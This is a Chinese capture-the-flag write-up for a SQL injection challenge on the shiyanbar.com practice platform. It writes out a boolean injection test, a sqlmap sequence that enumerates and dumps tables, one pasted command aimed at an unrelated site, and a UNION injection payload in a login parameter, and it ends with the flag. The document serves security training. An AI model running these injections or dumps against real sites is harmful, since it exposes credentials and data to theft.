# 问题

注入注入注入～～

解题链接： http://ctf4.shiyanbar.com:8080/6/

# WriteUp

看了下面讨论区，知道有个：

```shell
http://ctf4.shiyanbar.com:8080/6/admin/
```
http://ctf5.shiyanbar.com/423/web/?id=
OK，要求我们用注入爆出用户名和密码

试了一下?id=1 and 1可以成功

于是就可以来盲注猜测用户名和密码的，根据admin那个页面猜用户名是usr，所以开始了：

```shell
http://ctf4.shiyanbar.com:8080/6/?id=1 and len("usr") > 5
```

其实这只是判断字符串usr的长度而已，不能这样搞，得先得到表名和字段名

用SQLmap跑一下，开Kali Linux：

注意得放url `http://ctf4.shiyanbar.com:8080/6/?id=0`，要不然跑半天跑不出来，依次跑库名、表名、列名，语句分别为：

当前数据库名：

```shell
sqlmap -u http://ctf4.shiyanbar.com:8080/6/?id=0 --current-db
```

获取所有数据库名称,输入：

```shell
sqlmap -u http://ctf4.shiyanbar.com:8080/6/?id=0 --dbs
```

获取当前数据库内所有表名称,输入：

```shell
sqlmap -u http://ctf4.shiyanbar.com:8080/6/?id=0 --tables
```

获取admin表内的列名,输入:

```shell
sqlmap -u http://ctf4.shiyanbar.com:8080/6/?id=0 -T admin --columns
```

获取name和password内的账户密码,输入：

```shell
python sqlmap.py -u "http://www.test.com/Art_Show.php?id=2"  -D mys -T zzcms_admin -C name,password --dump
```

但是跑出来的2个admin表，只能知道用户名是admin，剩下的无能为力了。

参考Write Up用到的一个注入，没看懂[http://www.shiyanbar.com/ctf/writeup/427](http://www.shiyanbar.com/ctf/writeup/427)：

```shell
http://ctf4.shiyanbar.com:8080/6/admin/?usr=admin' and 1=2 union SELECT NULL,NULL,NULL from admin &pwd=1
```

总之可以获得表名CTFS_FLAG，再跑一下key字段的值就行了：

```shell
sqlmap -u http://ctf4.shiyanbar.com:8080/6/?id=0 -T CTFS_FLAG -C key --dump
```

最终结果：`{ctfgoodjob!}`
